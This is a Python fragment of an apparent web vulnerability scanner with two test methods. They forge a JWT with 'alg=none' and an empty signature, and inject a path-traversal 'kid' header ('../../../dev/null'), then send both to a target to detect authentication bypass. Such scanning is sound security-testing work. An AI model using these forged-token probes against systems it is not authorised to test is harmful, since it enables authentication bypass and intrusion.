    def test_jwt_alg_none(self):
        """JWT alg=none attack — strip signature."""
        self._print("[*]", "JWT alg=none attack...", "INFO")
        # Get a JWT from response first
        r = self._get(self.target)
        if not r: return
        jwt_match = re.search(
            r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',
            (r.text or "") + " " + (r.headers.get("Authorization", "")))
        if not jwt_match: return
        token = jwt_match.group(0)
        try:
            parts = token.split(".")
            # Decode header
            header_b64 = parts[0]
            pad = "=" * (-len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64 + pad))
            # Modify header to alg=none
            header["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()).rstrip(b"=").decode()
            # Send token with empty signature
            forged_token = f"{new_header}.{parts[1]}."
            baseline = self._get(self.target, headers={"Authorization": "Bearer invalidtoken"})
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {forged_token}",
                                                  "Cookie": f"token={forged_token}"})
            if (r2 and r2.status_code == 200
                    and baseline and baseline.status_code in (401, 403)):
                self._add_vuln("JWT alg=none accepted", "CRITICAL",
                                self.target, "forged token with alg=none accepted",
                                original_token=token[:50] + "...")
        except Exception:
            pass

    def test_jwt_kid_injection(self):
        """JWT kid header injection."""
        self._print("[*]", "JWT kid injection test...", "INFO")
        # Check if we have any JWTs already detected
        for jwt_info in self.results.get("jwt_tokens", [])[:3]:
            token = jwt_info.get("token", "")
            if not token: continue
            try:
                parts = token.split(".")
                header_b64 = parts[0]
                pad = "=" * (-len(header_b64) % 4)
                header = json.loads(base64.urlsafe_b64decode(header_b64 + pad))
                # Modify kid to inject payload
                header["kid"] = "../../../dev/null"
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()).rstrip(b"=").decode()
                forged_token = f"{new_header}.{parts[1]}.{parts[2]}"
                r = self._get(self.target, headers={"Authorization": f"Bearer {forged_token}"})
                if r and r.status_code == 200:
                    self._add_vuln("JWT (kid injection)", "CRITICAL",
                                    self.target, "kid header injection accepted",
                                    kid="../../../dev/null")
            except Exception:
                pass

